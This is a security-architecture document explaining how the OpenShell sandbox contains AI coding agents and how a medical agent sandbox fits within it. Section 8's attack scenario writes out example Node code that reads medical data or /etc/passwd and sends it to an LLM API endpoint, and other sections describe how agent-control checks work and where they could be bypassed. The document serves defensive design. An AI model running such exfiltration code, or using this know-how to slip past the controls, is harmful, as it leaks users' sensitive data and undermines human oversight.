# OpenShell Security Architecture & Medical Sandbox Workflow

This document provides a comprehensive explanation of how NVIDIA OpenShell secures AI agents,
why certain design decisions exist, and how the `openclaw-medical` sandbox works within
this security framework. It is intended for developers, operators, and contributors who
need to understand the system deeply before making changes.

---

## Table of Contents

1. [The Problem OpenShell Solves](#1-the-problem-openshell-solves)
2. [Defense-in-Depth: Four Security Layers](#2-defense-in-depth-four-security-layers)
3. [Layer 1: Filesystem Isolation (Landlock LSM)](#3-layer-1-filesystem-isolation-landlock-lsm)
4. [Layer 2: Process Isolation (seccomp BPF + Privilege Dropping)](#4-layer-2-process-isolation-seccomp-bpf--privilege-dropping)
5. [Layer 3: Network Isolation (netns + HTTP CONNECT Proxy + OPA)](#5-layer-3-network-isolation-netns--http-connect-proxy--opa)
6. [Layer 4: Inference Isolation (inference.local Routing)](#6-layer-4-inference-isolation-inferencelocal-routing)
7. [Binary-Endpoint Binding: Deep Dive](#7-binary-endpoint-binding-deep-dive)
8. [Why /usr/bin/node Must NOT Be in External API Policies](#8-why-usrbinnode-must-not-be-in-external-api-policies)
9. [Live Policy Updates](#9-live-policy-updates)
10. [Provider System & Credential Management](#10-provider-system--credential-management)
11. [What Our Medical Sandbox Does Differently](#11-what-our-medical-sandbox-does-differently)
12. [Quick Reference: Allowed vs Blocked](#12-quick-reference-allowed-vs-blocked)

---

## 1. The Problem OpenShell Solves

AI agents (Claude Code, OpenClaw, Codex, etc.) are powerful because they can execute
arbitrary code. This is also what makes them dangerous in uncontrolled environments:

```
  USER REQUEST                    AGENT ACTION                 RISK
  ─────────────                   ────────────                 ────
  "Fix this bug"          →  Reads source code          →  Safe
  "Install dependencies"  →  Runs npm install           →  Runs arbitrary scripts
  "Call the API"          →  Makes HTTP requests        →  Could exfiltrate data
  "Write a script"        →  Creates & executes code    →  Full system access
```

Without sandboxing, an agent has the same access as the user running it. A compromised
or misbehaving agent could:

- Read sensitive files (SSH keys, API tokens, credentials)
- Exfiltrate data through outbound HTTP requests
- Modify system files or install backdoors
- Open network connections to arbitrary hosts
- Escalate privileges via kernel exploits

OpenShell solves this by wrapping every agent process in a sandbox with **four
independent, defense-in-depth security layers**. Each layer operates at a different
level of the stack, so compromising one does not compromise the others.

---

## 2. Defense-in-Depth: Four Security Layers

```
┌──────────────────────────────────────────────────────────────────────┐
│                        HOST SYSTEM                                   │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │               KUBERNETES CLUSTER (K3s in Docker)               │  │
│  │                                                                │  │
│  │  ┌──────────────────────────────────────────────────────────┐  │  │
│  │  │                    GATEWAY                               │  │  │
│  │  │  - gRPC control plane (mTLS)                             │  │  │
│  │  │  - Provider credential store                             │  │  │
│  │  │  - Inference route management                            │  │  │
│  │  │  - Policy versioning & distribution                      │  │  │
│  │  └──────────────────────────────────────────────────────────┘  │  │
│  │                                                                │  │
│  │  ┌──────────────────────────────────────────────────────────┐  │  │
│  │  │                  SANDBOX POD                              │  │  │
│  │  │                                                          │  │  │
│  │  │  ┌────────────────────────────────────────────────────┐  │  │  │
│  │  │  │  SUPERVISOR (runs as root, OUTSIDE security boundary) │  │  │
│  │  │  │                                                    │  │  │  │
│  │  │  │  ┌──────────────┐  ┌──────────────┐               │  │  │  │
│  │  │  │  │ HTTP CONNECT │  │  Inference    │               │  │  │  │
│  │  │  │  │ Proxy + OPA  │  │  Router       │               │  │  │  │
│  │  │  │  │ (Layer 3)    │  │  (Layer 4)    │               │  │  │  │
│  │  │  │  └──────┬───────┘  └──────┬────────┘               │  │  │  │
│  │  │  │         │                 │                         │  │  │  │
│  │  │  │  ═══════╪═════════════════╪══════ SECURITY BOUNDARY │  │  │  │
│  │  │  │         │   veth pair     │                         │  │  │  │
│  │  │  │  ┌──────┴─────────────────┴────────────────────┐    │  │  │  │
│  │  │  │  │  AGENT PROCESS (runs as 'sandbox' user)     │    │  │  │  │
│  │  │  │  │                                             │    │  │  │  │
│  │  │  │  │  ┌─────────────┐  ┌─────────────────────┐   │    │  │  │  │
│  │  │  │  │  │ Landlock    │  │ seccomp BPF         │   │    │  │  │  │
│  │  │  │  │  │ (Layer 1)   │  │ (Layer 2)           │   │    │  │  │  │
│  │  │  │  │  └─────────────┘  └─────────────────────┘   │    │  │  │  │
│  │  │  │  │                                             │    │  │  │  │
│  │  │  │  │  Network Namespace: 10.200.0.2/24           │    │  │  │  │
│  │  │  │  │  Only route: via 10.200.0.1 (proxy)         │    │  │  │  │
│  │  │  │  └─────────────────────────────────────────────┘    │  │  │  │
│  │  │  └────────────────────────────────────────────────────┘  │  │  │
│  │  └──────────────────────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

The critical insight: the **supervisor** (proxy, inference router, SSH server) runs
**outside** the security boundary as root. The **agent process** runs **inside** with
all four layers applied. The proxy can make outbound connections that the agent cannot.

---

## 3. Layer 1: Filesystem Isolation (Landlock LSM)

Landlock is a Linux Security Module that restricts filesystem access at the kernel level.
Unlike chroot or bind mounts, it cannot be bypassed by the sandboxed process — the kernel
enforces it unconditionally.

### How It Works

```
  POLICY (policy.yaml)                         KERNEL ENFORCEMENT
  ──────────────────                           ──────────────────

  filesystem_policy:                           Landlock ruleset applied
    read_only:                                 in pre_exec (after fork,
      - /usr          ← system binaries         before exec):
      - /lib          ← shared libraries
      - /proc         ← process info            1. initgroups()
      - /dev/urandom  ← entropy source          2. setgid(sandbox)
      - /etc          ← configuration           3. setuid(sandbox)
      - /var/log      ← log files               4. landlock_create_ruleset()
    read_write:                                  5. landlock_add_rule() × N
      - /sandbox      ← agent workspace         6. landlock_restrict_self()
      - /tmp          ← temporary files          7. seccomp_load() [Layer 2]
      - /dev/null     ← discard output           8. exec(agent command)
```

### What This Means

| Path | Access | Why |
|------|--------|-----|
| `/usr/bin/node`, `/usr/bin/python3` | Read + Execute | Agent needs its runtime |
| `/sandbox/` | Read + Write + Execute | Agent's workspace |
| `/tmp/` | Read + Write | Temporary files |
| `/etc/openshell-tls/` | Read only | TLS certificates for inference.local |
| `/usr/`, `/lib/`, `/etc/` | Read only | System files — cannot modify |
| `~/.ssh/`, `/root/` | **BLOCKED** | Not in either list = no access |
| `/home/` (host) | **BLOCKED** | Not mounted into container |

### Key Properties

- **Immutable after startup**: Applied in the child process `pre_exec()`, before the agent
  binary even starts. Cannot be changed, relaxed, or removed for the sandbox's lifetime.
- **Kernel-enforced**: Even root cannot bypass Landlock from inside the sandbox (the
  process has already dropped privileges via setuid before Landlock is applied).
- **Fail-closed**: If `compatibility: best_effort` and the kernel doesn't support
  Landlock, the sandbox still starts but logs a warning. If `compatibility: hard_requirement`,
  startup fails on unsupported kernels.

---

## 4. Layer 2: Process Isolation (seccomp BPF + Privilege Dropping)

### Privilege Dropping

Before the agent process runs, the supervisor:

```
  SUPERVISOR (root)                    CHILD PROCESS (sandbox)
  ─────────────────                    ───────────────────────

  fork() ──────────────────────────→  pre_exec():
                                        1. initgroups("sandbox")
                                        2. setgid(sandbox_gid)
                                        3. verify getegid() == sandbox_gid
                                        4. setuid(sandbox_uid)
                                        5. verify geteuid() == sandbox_uid
                                        6. verify setuid(0) FAILS ← cannot re-escalate
                                        7. apply Landlock [Layer 1]
                                        8. apply seccomp [this layer]
                                        9. exec(agent_command)
```

The `run_as_user` and `run_as_group` must both be `"sandbox"` — hardcoded validation
rejects any other value.

### seccomp BPF Syscall Filtering

seccomp BPF filters are applied to the `socket()` system call to block dangerous
network socket types:

```
  SOCKET DOMAIN         CONSTANT    STATUS     REASON
  ─────────────         ────────    ──────     ──────
  AF_INET   (IPv4)      2           ALLOWED    Needed for proxy communication
  AF_INET6  (IPv6)      10          ALLOWED    Needed for proxy communication
  AF_UNIX   (local)     1           ALLOWED    IPC between processes
  AF_NETLINK             16          BLOCKED    Prevents routing/firewall manipulation
  AF_PACKET              17          BLOCKED    Prevents raw packet capture/injection
  AF_BLUETOOTH           31          BLOCKED    Prevents Bluetooth access
  AF_VSOCK               40          BLOCKED    Prevents VM socket communication
```

Even though `AF_INET` and `AF_INET6` are allowed, the agent cannot reach the internet
directly because of **Layer 3** — all traffic is routed through the network namespace
to the proxy.

---

## 5. Layer 3: Network Isolation (netns + HTTP CONNECT Proxy + OPA)

This is the most sophisticated layer. It combines three mechanisms:

### 5a. Network Namespace Isolation

```
  HOST NETWORK                              SANDBOX NETWORK NAMESPACE
  ────────────                              ──────────────────────────

  ┌──────────────────┐                      ┌──────────────────────┐
  │ Supervisor        │                      │ Agent Process         │
  │                   │                      │                       │
  │ Proxy listens on  │    veth pair         │ Only interface:       │
  │ 10.200.0.1:3128  ◄────────────────────► │ 10.200.0.2/24         │
  │                   │                      │                       │
  │ Can reach:        │                      │ Default route:        │
  │ - External APIs   │                      │ via 10.200.0.1        │
  │ - Gateway (gRPC)  │                      │                       │
  │ - Internet        │                      │ Can ONLY reach:       │
  │                   │                      │ 10.200.0.1 (proxy)    │
  └──────────────────┘                      └──────────────────────┘
```

The agent process is placed in its own Linux network namespace with a single veth
interface. The **only** IP address it can reach is `10.200.0.1` — the proxy. Even if
the agent sets `HTTP_PROXY=""` or tries to make direct connections, the kernel routes
them all through the veth pair to the proxy.

### 5b. HTTP CONNECT Proxy with OPA Policy Engine

Every outbound connection from the agent goes through the proxy as an HTTP CONNECT request:

```
  AGENT PROCESS                  PROXY (10.200.0.1:3128)              EXTERNAL
  ─────────────                  ───────────────────────              ────────

  CONNECT api.nvidia.com:443
  ──────────────────────────→   1. Parse CONNECT target
                                 2. Identify calling binary:
                                    /proc/net/tcp → inode
                                    /proc/{pid}/fd → match inode
                                    /proc/{pid}/exe → binary path
                                    /proc/{pid}/status → ancestor chain
                                 3. Query OPA engine:
                                    input = {
                                      network: {host, port},
                                      exec: {path, ancestors, cmdline_paths}
                                    }
                                 4. OPA evaluates against policy.yaml:
                                    ┌─────────────────────────────────┐
                                    │ network_policies:               │
                                    │   nvidia:                       │
                                    │     endpoints:                  │
                                    │       - host: integrate...      │
                                    │         port: 443               │
                                    │     binaries:                   │
                                    │       - path: /usr/bin/curl     │ ← IS the binary curl?
                                    │       - path: /bin/bash         │
                                    │       - path: /usr/bin/python3  │
                                    └─────────────────────────────────┘

                                 5a. MATCH (binary=curl, endpoint=nvidia):
                                     ← 200 Connection Established ──→  TCP connect
                                     ← bidirectional relay ──────────→

                                 5b. NO MATCH (binary=node):
                                     ← 403 Forbidden
                                     Connection closed.
```

### 5c. OPA/Rego Policy Engine

The policy engine is embedded (Rust crate `regorus`) — no external OPA daemon. The Rego
rules are compiled into the binary at build time.

**Decision flow for each CONNECT request:**

```
  allow_network = true
    IF ∃ policy ∈ network_policies:
      endpoint_allowed(policy, {host, port})    ← host:port matches an endpoint
      AND binary_allowed(policy, {path, ancestors, cmdline_paths})  ← binary is allowed
```

**Binary matching strategies** (tried in order):

1. **Exact path**: `exec.path == binary.path`
2. **Ancestor match**: Any entry in `exec.ancestors[]` matches `binary.path`
   (e.g., `/usr/local/bin/claude` spawns `/usr/bin/node` — claude is the ancestor)
3. **Glob match**: If `binary.path` contains `*`, match with `/` as delimiter
   (`*` = one path segment, `**` = recursive)

**NOT matched**: `cmdline_paths` — intentionally excluded because `argv[0]` is trivially
spoofable via `execve()`.

### 5d. L7 Inspection (Optional)

For endpoints with `protocol: rest` and `tls: terminate`, the proxy performs TLS MITM
using an ephemeral CA and inspects individual HTTP requests:

```
  ENDPOINT CONFIG                              ENFORCEMENT
  ───────────────                              ───────────

  endpoints:
    - host: api.github.com
      port: 443
      protocol: rest              ← Triggers L7 inspection
      tls: terminate              ← Proxy generates leaf cert, MITMs
      enforcement: enforce        ← Violations return 403 (not just logged)
      rules:
        - allow:
            method: GET           ← Only GET allowed
            path: "/**"           ← Any path
        - allow:
            method: HEAD
            path: "/**"

  Result: GET /repos/foo/bar  → ALLOWED
          POST /repos/foo/bar → 403 DENIED (enforcement: enforce)
          DELETE /anything    → 403 DENIED
```

---

## 6. Layer 4: Inference Isolation (inference.local Routing)

This is the critical layer for understanding why the NVIDIA API "fix" must NOT involve
adding node to the network policy.

### The Problem

AI agents need to call LLM APIs (NVIDIA, OpenAI, Anthropic) for inference. But the agent
runtime (`/usr/bin/node` for OpenClaw) must NOT have direct network access to these APIs,
because agent-generated code also runs as node and could exfiltrate data through them.

### The Solution: inference.local

OpenShell provides a virtual endpoint `inference.local:443` that the agent targets instead
of real API endpoints. The supervisor proxy intercepts this and routes it securely:

```
  INSIDE SANDBOX (restricted)                   OUTSIDE SANDBOX (trusted)
  ───────────────────────────                   ─────────────────────────

  ┌─────────────────────┐                       ┌─────────────────────────┐
  │ Agent (node)        │                       │ Supervisor Proxy        │
  │                     │                       │                         │
  │ fetch("https://     │  CONNECT              │ 1. Intercept CONNECT    │
  │  inference.local    │  inference.local:443   │ 2. TLS terminate (MITM) │
  │  /v1/chat/          │ ─────────────────────→ │ 3. Parse HTTP request   │
  │  completions",      │                       │ 4. Detect pattern:      │
  │  {model: "...",     │                       │    POST /v1/chat/compl. │
  │   messages: [...]}  │                       │    → openai_chat_compl. │
  │ )                   │                       │ 5. Select route from    │
  │                     │                       │    cache (refreshed     │
  │                     │                       │    every 30s from       │
  │                     │                       │    gateway)             │
  │                     │                       │ 6. Rewrite request:     │
  │                     │  ← 200 OK             │    - Strip agent's auth │
  │                     │  ← streamed response  │    - Inject real API key│
  │                     │ ◄───────────────────── │    - Rewrite model field│
  │                     │                       │    - Add default headers│
  └─────────────────────┘                       │ 7. Forward to backend   │
                                                │                         │
                                                │    ┌─────────────────┐  │
                                                │    │ integrate.api.  │  │
                                                │    │ nvidia.com/v1   │  │
                                                │    └────────┬────────┘  │
                                                │             │           │
                                                │    OR       │           │
                                                │    ┌────────┴────────┐  │
                                                │    │ api.openai.com  │  │
                                                │    │ api.anthropic.  │  │
                                                │    │ localhost:11434 │  │
                                                │    │ (Ollama)        │  │
                                                │    └─────────────────┘  │
                                                └─────────────────────────┘
```

### Control Plane vs Data Plane

```
  CONTROL PLANE (one-time setup, outside sandbox)
  ───────────────────────────────────────────────

  $ openshell provider create --name nvidia --type nvidia --from-existing
    → Discovers NVIDIA_API_KEY from environment
    → Stores provider record on gateway

  $ openshell inference set --provider nvidia --model moonshotai/kimi-k2.5
    → Validates provider has a key
    → Probes endpoint (lightweight request)
    → Creates route: inference.local → nvidia provider + model
    → Route stores ONLY provider_name + model_id (not credentials)


  DATA PLANE (per-request, inside sandbox)
  ────────────────────────────────────────

  Every 30 seconds, sandbox polls gateway:
    GetInferenceBundle() → resolves route dynamically:
      - Looks up provider record → gets current API key
      - Looks up provider profile → gets base URL, auth style, protocols
      - Returns fully resolved route to sandbox proxy

  Per request:
    Agent → CONNECT inference.local:443 → proxy intercepts
    Proxy → TLS terminates → parses HTTP → detects inference pattern
    Proxy → selects route → rewrites auth/model → forwards to backend
    Backend → streams response → proxy relays back → agent receives
```

### Supported Inference Patterns

| Method | Path | Protocol | Kind |
|--------|------|----------|------|
| `POST` | `/v1/chat/completions` | `openai_chat_completions` | Chat completion |
| `POST` | `/v1/completions` | `openai_completions` | Text completion |
| `POST` | `/v1/responses` | `openai_responses` | Responses API |
| `POST` | `/v1/messages` | `anthropic_messages` | Anthropic messages |
| `GET` | `/v1/models` | `model_discovery` | List models |
| `GET` | `/v1/models/*` | `model_discovery` | Get model info |

Requests that don't match any pattern get `403 Forbidden`.

### Provider Profiles

| Provider | Default Base URL | Auth Style | Credential Keys |
|----------|-----------------|------------|-----------------|
| `openai` | `https://api.openai.com/v1` | `Authorization: Bearer` | `OPENAI_API_KEY` |
| `anthropic` | `https://api.anthropic.com/v1` | `x-api-key` | `ANTHROPIC_API_KEY`, `CLAUDE_API_KEY` |
| `nvidia` | `https://integrate.api.nvidia.com/v1` | `Authorization: Bearer` | `NVIDIA_API_KEY` |

### Switching Providers (Zero Code Changes)

Because agent code always targets `inference.local`, switching providers is a control-plane
operation that requires no code changes and no policy modifications:

```bash
# Switch to NVIDIA
openshell inference set --provider nvidia --model moonshotai/kimi-k2.5

# Switch to Claude
openshell inference set --provider claude --model claude-sonnet-4-20250514

# Switch to ChatGPT
openshell inference set --provider openai --model gpt-4o

# Switch to Ollama (local)
openshell inference set --provider ollama --model llama3
```

The sandbox picks up the new route within 30 seconds (next poll). The agent continues
calling `inference.local` — the proxy handles the rest.

---

## 7. Binary-Endpoint Binding: Deep Dive

The core security mechanism of Layer 3 is **binary-endpoint binding**: each network
policy specifies which exact binaries can reach which exact endpoints. This section
explains how binary identity is resolved.

### Process Identity Resolution

When the proxy receives a CONNECT request, it must determine which binary initiated it.
This uses Linux `/proc` filesystem introspection:

```
  STEP 1: Socket → Inode
  ──────────────────────
  Client TCP source port (from CONNECT request) →
    /proc/net/tcp (hex-encoded local port:remote port) →
    inode number

  STEP 2: Inode → PID
  ───────────────────
  Walk /proc/{pid}/fd/ for all PIDs under entrypoint:
    readlink(/proc/{pid}/fd/{n}) → socket:[inode]
    Match inode → found PID

  STEP 3: PID → Binary Path
  ─────────────────────────
  readlink(/proc/{pid}/exe) → /usr/bin/node (actual binary on disk)

  STEP 4: PID → Ancestor Chain
  ────────────────────────────
  /proc/{pid}/status → PPid: {parent_pid}
  Walk up PPid chain until reaching entrypoint PID:
    ancestors = [/usr/local/bin/claude, /usr/bin/node, ...]

  STEP 5: PID → Cmdline Paths
  ───────────────────────────
  /proc/{pid}/cmdline → extract absolute paths from argv
  NOTE: cmdline_paths are used for diagnostics ONLY.
  They are NOT used for granting access (argv[0] is spoofable).
```

### SHA256 Trust-On-First-Use (TOFU)

Binary integrity is enforced via SHA256 hashing:

```
  First time /usr/bin/curl makes a connection:
    1. Proxy resolves binary path → /usr/bin/curl
    2. Computes SHA256(/usr/bin/curl) → abc123...
    3. Caches: {"/usr/bin/curl": "abc123..."}
    4. Policy check proceeds normally

  Subsequent connection from /usr/bin/curl:
    1. Proxy resolves binary path → /usr/bin/curl
    2. Computes SHA256(/usr/bin/curl) → abc123...
    3. Compares against cache → MATCH → proceed
    OR
    3. Compares against cache → MISMATCH → DENY
       (binary was replaced/modified since first use)
```

This prevents attacks where agent-generated code overwrites a trusted binary.

### OPA Rego Matching Rules

The Rego policy engine evaluates binary identity using these rules (in order):

```
  Rule 1: Exact Path Match
  ────────────────────────
  binary_allowed(policy, exec) IF exec.path == binary.path
  Example: exec.path="/usr/bin/curl", binary.path="/usr/bin/curl" → MATCH

  Rule 2: Ancestor Match
  ──────────────────────
  binary_allowed(policy, exec) IF exec.ancestors[_] == binary.path
  Example: exec.path="/usr/bin/node"
           exec.ancestors=["/usr/local/bin/claude"]
           binary.path="/usr/local/bin/claude" → MATCH
           (claude spawned node, claude is trusted)

  Rule 3: Glob Match
  ─────────────────
  binary_allowed(policy, exec) IF glob.match(binary.path, ["/"], exec.path)
  Example: binary.path="/sandbox/.venv/bin/python*"
           exec.path="/sandbox/.venv/bin/python3.13" → MATCH
           ("*" matches one path segment, "**" matches recursively)
```

### Why Ancestor Matching Matters

The Claude Code CLI (`/usr/local/bin/claude`) spawns `/usr/bin/node` to execute its
TypeScript code. When node makes a network request, its `exec.path` is `/usr/bin/node`,
but its ancestor chain includes `/usr/local/bin/claude`.

The `claude_code` policy allows `/usr/local/bin/claude` in its binaries list. Through
ancestor matching, node inherits claude's network permissions — but ONLY when spawned
by claude. If the agent generates a standalone node script and runs it directly, the
ancestor chain won't include claude, and the policy won't match.

```
  claude CLI → spawns node → node calls api.anthropic.com
  Ancestor chain: [/usr/local/bin/claude]
  Binary match: /usr/local/bin/claude (ancestor) → ALLOWED

  agent code → spawns node → node calls api.anthropic.com
  Ancestor chain: [/usr/bin/node, /usr/local/bin/openclaw-gateway, ...]
  Binary match: none of the ancestors are in claude_code policy → DENIED
```

---

## 8. Why /usr/bin/node Must NOT Be in External API Policies

This is the single most important section in this document.

### The Trust Boundary

```
  TRUSTED BINARIES                           UNTRUSTED EXECUTION
  ────────────────                           ───────────────────

  /usr/local/bin/claude  ← Installed binary,    /usr/bin/node ← Agent RUNTIME.
                           known behavior,                       Executes arbitrary
                           integrity-verified                    code generated by
                                                                 the AI agent.
  /usr/bin/curl          ← System tool,
                           predictable behavior   Agent writes: "fetch('https://
                                                  integrate.api.nvidia.com/v1',
  /usr/bin/git           ← System tool,          {body: JSON.stringify(
                           scoped to git ops       fs.readFileSync('/etc/passwd')
                                                  )})"
  /usr/bin/python3       ← Used by specific
                           operator scripts,      If node has NVIDIA API access,
                           NOT agent code          this script exfiltrates data.
```

### The Attack Scenario

If `/usr/bin/node` were added to the `nvidia` network policy:

```
  STEP 1: User asks agent: "Analyze my medical data"

  STEP 2: Agent generates code (looks innocent):
    const data = require('fs').readFileSync('/sandbox/data/medical.db');

  STEP 3: Agent generates code (data exfiltration):
    fetch('https://integrate.api.nvidia.com/v1/chat/completions', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + process.env.NVIDIA_API_KEY },
      body: JSON.stringify({
        model: 'nvidia/nemotron-3-super',
        messages: [{ role: 'user', content: data.toString('base64') }]
      })
    });

  STEP 4: Network policy check:
    Binary: /usr/bin/node
    Endpoint: integrate.api.nvidia.com:443
    Policy: nvidia → binaries includes /usr/bin/node
    Result: ✅ ALLOWED  ← DATA EXFILTRATED!
```

### The Correct Path: inference.local

With `inference.local`, the same scenario is blocked:

```
  STEP 1-2: Same as above

  STEP 3: Agent tries to exfiltrate:
    fetch('https://integrate.api.nvidia.com/v1/chat/completions', ...)

  STEP 4: Network policy check:
    Binary: /usr/bin/node
    Endpoint: integrate.api.nvidia.com:443
    Policy: nvidia → binaries does NOT include /usr/bin/node
    Result: ❌ DENIED  ← BLOCKED!

  STEP 3 (legitimate): Agent calls inference normally:
    fetch('https://inference.local/v1/chat/completions', {
      body: JSON.stringify({
        messages: [{ role: 'user', content: 'Summarize this data' }]
      })
    });

  STEP 4: Proxy intercepts CONNECT inference.local:443
    → TLS terminates
    → Parses request
    → Detects openai_chat_completions pattern
    → Strips agent's auth headers
    → Injects real NVIDIA API key (from gateway)
    → Rewrites model to configured model
    → Forwards to integrate.api.nvidia.com
    Result: ✅ ALLOWED (through secure proxy, not direct node access)
```

### Key Differences

| Aspect | Direct node access (INSECURE) | inference.local (SECURE) |
|--------|-------------------------------|--------------------------|
| Who makes outbound connection | Agent process (node) | Supervisor proxy |
| API key exposure | Available in node's environment | Never exposed to agent |
| Endpoint reachable | Any endpoint in policy | Only inference.local |
| Model field | Agent-controlled | Rewritten by proxy |
| Request inspection | None | Pattern detection (only inference APIs) |
| Data exfiltration | Possible via request body | Body goes through legitimate inference only |
| Auth headers | Agent can set arbitrary | Stripped and re-injected by proxy |

---

## 9. Live Policy Updates

Network policies can be updated on running sandboxes without restarts. This is how
operators can grant additional access (e.g., new messaging endpoint) while the sandbox
is running.

### Update Flow

```
  OPERATOR                     GATEWAY                          SANDBOX
  ────────                     ───────                          ───────

  openshell policy set
    sandbox-name
    --policy updated.yaml
  ──────────────────────→  1. Validate static fields
                              unchanged (filesystem,
                              landlock, process)
                           2. Create PolicyRecord:
                              version=N, status=pending
                           3. Supersede older pending
                              revisions
                       ←── Return version=N, hash

                                                    ┌── Every 10 seconds ──┐
                                                    │ GetSandboxSettings() │
                                              ←──── │ version > current?   │
                           Return policy v=N ────→  │ YES: reload OPA      │
                                                    │                      │
                                                    │ OpaEngine::          │
                                                    │   reload_from_proto()│
                                                    │                      │
                                                    │ Success:             │
                                              ←──── │   ReportPolicyStatus │
                                                    │   (v=N, LOADED)      │
                                                    │                      │
                                                    │ Failure:             │
                                                    │   Keep old engine    │
                                                    │   (Last-Known-Good)  │
                                              ←──── │   ReportPolicyStatus │
                                                    │   (v=N, FAILED, err) │
                                                    └──────────────────────┘
```

### Static vs Dynamic Fields

| Category | Fields | Updatable? | Why |
|----------|--------|------------|-----|
| **Static** | `filesystem_policy`, `landlock`, `process` | No | Applied in kernel at startup; cannot be reversed |
| **Dynamic** | `network_policies` | Yes | Evaluated per-request by OPA; engine can be atomically swapped |

### Last-Known-Good (LKG) Rollback

If a policy update fails validation, the previous policy stays active:

```
  Current policy: v3 (working)
  New policy:     v4 (invalid: rules + access both set on endpoint)

  OpaEngine::reload_from_proto(v4)
    → Builds new engine
    → Validation fails
    → Old engine (v3) untouched
    → Reports FAILED to gateway
    → Operator sees error via: openshell policy get sandbox-name
```

---

## 10. Provider System & Credential Management

API credentials never appear in pod specs or agent environment variables.

### Credential Lifecycle

```
  HOST MACHINE                 GATEWAY                      SANDBOX
  ────────────                 ───────                      ───────

  1. CLI detects local
     NVIDIA_API_KEY
     from environment
  ──────────────────→  2. Stores Provider record:
                          name: "nvidia"
                          type: "nvidia"
                          credentials: {NVIDIA_API_KEY: "nvapi-..."}

                       3. On sandbox creation:
                          SandboxSpec.providers = ["nvidia"]
                          Does NOT inject creds into pod spec

                                                  4. Supervisor starts:
                                                     GetSandboxProviderEnvironment()
                                            ←──── 5. Request provider env
                       6. Resolves "nvidia" →
                          {NVIDIA_API_KEY: "nvapi-..."}
                       ────→                      7. Builds placeholder registry:
                                                     Child env: NVIDIA_API_KEY=
                                                       "openshell:resolve:env:NVIDIA_API_KEY"
                                                     Supervisor holds: real key in memory

                                                  8. Agent runs with placeholder:
                                                     process.env.NVIDIA_API_KEY
                                                       == "openshell:resolve:env:..."
                                                     (useless to the agent)

                                                  9. Outbound proxy request:
                                                     Authorization: Bearer
                                                       openshell:resolve:env:NVIDIA_API_KEY
                                                     Proxy rewrites to:
                                                       Authorization: Bearer nvapi-...
                                                     (real key injected at proxy time)
```

### Security Properties

- Real credentials exist only in gateway persistence and supervisor memory
- Agent process only sees placeholder strings
- Placeholders are resolved by the proxy at the moment of outbound connection
- Credential rotation on the gateway takes effect on next proxy request

---

## 11. What Our Medical Sandbox Does Differently

The `openclaw-medical` sandbox builds on `openclaw-nvidia` and inherits the full
security model described above. Here is what it adds and how each addition works
within the security framework:

### Inference (All Providers via inference.local)

```
  Agent code (unchanged)              Provider switching (outside sandbox)
  ──────────────────────              ─────────────────────────────────────

  fetch("https://inference.local     $ openshell inference set \
    /v1/chat/completions", ...)          --provider nvidia \
                                         --model moonshotai/kimi-k2.5
  Same code works for ALL providers:
                                     $ openshell inference set \
  - NVIDIA (integrate.api.nvidia)        --provider claude \
  - Claude (api.anthropic.com)           --model claude-sonnet-4-20250514
  - ChatGPT (api.openai.com)
  - Ollama (localhost:11434)         $ openshell inference set \
                                         --provider openai \
  No policy changes needed.              --model gpt-4o
  No code changes needed.
```

### Messaging Bridges (Scoped Python Access)

The messaging bridges run as **Python scripts** (not node), which means they use the
`/sandbox/.venv/bin/python` binary. This binary gets scoped access to messaging APIs
in the policy — completely separate from the agent runtime (node).

```
  SECURITY MODEL FOR MESSAGING:

  ┌─────────────────────────────────────────────────────┐
  │ Agent (node)                                        │
  │   Cannot reach: api.telegram.org                    │
  │   Cannot reach: discord.com                         │
  │   CAN reach: inference.local (via proxy)            │
  │   CAN reach: localhost:18788 (local OpenClaw GW)    │
  └─────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────┐
  │ Telegram Bridge (python)                            │
  │   CAN reach: api.telegram.org:443 (policy: telegram)│
  │   CAN reach: localhost:18788 (OpenClaw gateway)     │
  │   Cannot reach: api.nvidia.com                      │
  │   Cannot reach: api.openai.com                      │
  └─────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────┐
  │ Discord Bridge (python)                             │
  │   CAN reach: discord.com:443 (policy: discord)      │
  │   CAN reach: gateway.discord.gg:443                 │
  │   CAN reach: localhost:18788 (OpenClaw gateway)     │
  │   Cannot reach: api.nvidia.com                      │
  └─────────────────────────────────────────────────────┘
```

Message flow: Telegram/Discord → Python bridge → OpenClaw gateway (localhost) → Agent → Response → Bridge → Telegram/Discord

### HuggingFace Models (Baked In + Runtime Python Access)

Models are downloaded during Docker build (baked into the image). For runtime model
downloads, the `huggingface` policy allows Python binary access to HuggingFace endpoints:

```
  BUILD TIME (no sandbox restrictions):
    download-models.py runs during docker build
    → Downloads vectorranger/embeddinggemma-300m-medical-300k
    → Stored at /sandbox/models/medical-embedding/

  RUNTIME (sandbox restrictions apply):
    /sandbox/.venv/bin/python → huggingface.co:443         ALLOWED (huggingface policy)
    /sandbox/.venv/bin/python → cdn-lfs.huggingface.co:443 ALLOWED (huggingface policy)
    /usr/bin/node             → huggingface.co:443         DENIED  (not in policy)
```

### New Policy Entries (Added to openclaw-nvidia base)

| Policy | Endpoints | Allowed Binaries | Purpose |
|--------|-----------|-----------------|---------|
| `telegram_bot` | `api.telegram.org:443` | `/usr/bin/curl`, `/sandbox/.venv/bin/python*` | Telegram bot bridge |
| `discord` | `discord.com:443`, `gateway.discord.gg:443`, `cdn.discordapp.com:443` | `/usr/bin/curl`, `/sandbox/.venv/bin/python*` | Discord bot bridge |
| `huggingface` | `huggingface.co:443`, `cdn-lfs.huggingface.co:443`, `cdn-lfs-us-1.huggingface.co:443` | `/sandbox/.venv/bin/python*`, `/usr/local/bin/uv`, `/usr/bin/curl` | Model downloads |
| `pypi` | `pypi.org:443`, `files.pythonhosted.org:443` | `/sandbox/.venv/bin/python*`, `/usr/local/bin/uv` | Python package installs |

Note: `/usr/bin/node` is NOT in any of these policies. The agent runtime has no access to messaging APIs, HuggingFace, or PyPI.

---

## 12. Quick Reference: Allowed vs Blocked

### What the Agent (node) CAN Do

| Action | How | Why It's Safe |
|--------|-----|---------------|
| Call LLM APIs (NVIDIA, Claude, OpenAI) | Via `inference.local` | Proxy handles auth, inspects requests, only inference patterns allowed |
| Read/write files in `/sandbox/` | Direct filesystem access | Landlock allows read-write |
| Read system files in `/usr/`, `/etc/` | Direct filesystem access | Landlock allows read-only |
